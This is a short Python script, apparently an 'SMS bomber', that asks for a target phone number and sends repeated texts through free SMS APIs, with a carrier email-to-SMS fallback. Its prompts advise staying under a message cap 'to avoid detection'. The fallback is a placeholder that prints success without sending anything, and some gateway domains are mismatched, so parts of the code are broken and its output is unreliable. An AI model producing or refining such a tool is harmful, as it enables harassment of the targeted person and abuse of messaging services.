import requests
import time
import random

# List of free APIs (limited usage)
APIs = [
    {
        "name": "TextBelt",
        "url": "https://textbelt.com/text",
        "params": lambda num, msg: {"phone": num, "message": msg, "key": "textbelt"},
    },
    {
        "name": "CallMeBot",
        "url": "https://api.callmebot.com/sms/send.php",
        "params": lambda num, msg: {"phone": num, "text": msg, "apikey": "123456"},  # Requires activation
    },
]

# Email-to-SMS gateways (for some carriers)
EMAIL_GATEWAYS = {
    "airtel": "@airtelmail.com",
    "vi": "@vtext.com",
    "jio": "@sms.jio.com",
}

def send_sms(phone_number, message, count=5, delay=5):
    print(f"💥 Sending {count} SMS to {phone_number}")

    for i in range(count):
        sent = False

        # Try SMS APIs
        for api in APIs:
            try:
                print(f"[*] Trying {api['name']}...")

                response = requests.post(api["url"], data=api["params"](phone_number, message))
                result = response.json()

                if response.status_code == 200 and (result.get("success") or "message_id" in result):
                    print(f"[+] SMS Sent Successfully via {api['url']}")
                    sent = True
                    break
                else:
                    print(f"[-] SMS Failed via {api['url']} - Response: {result}")

            except Exception as e:
                print(f"[!] Error with {api['name']}: {str(e)}")

        # Try email-to-SMS (carrier-specific)
        if not sent:
            for carrier, gateway in EMAIL_GATEWAYS.items():
                try:
                    email = f"{phone_number}{gateway}"
                    print(f"[📧] Sending via Email-to-SMS: {email}")
                    # Here, you would use an SMTP client to send an email
                    # Placeholder for email sending function
                    sent = True
                    print(f"[+] Email-SMS sent to {email}")
                    break
                except Exception as e:
                    print(f"[!] Error sending Email-SMS: {str(e)}")

        if not sent:
            print(f"[✖] SMS #{i+1} failed. No working API.")
        time.sleep(random.randint(delay, delay + 3))

    print("\n💀 SMS Bombing Completed! 💀")

# Example usage
if __name__ == "__main__":
    phone_number = input("Enter Target Phone Number (with Country Code): ")
    message = input("Enter Message: ")
    count = int(input("How many SMS to send? (Max 10 to avoid detection): "))
    delay = int(input("Enter delay between messages (in seconds): "))

    send_sms(phone_number, message, count, delay)
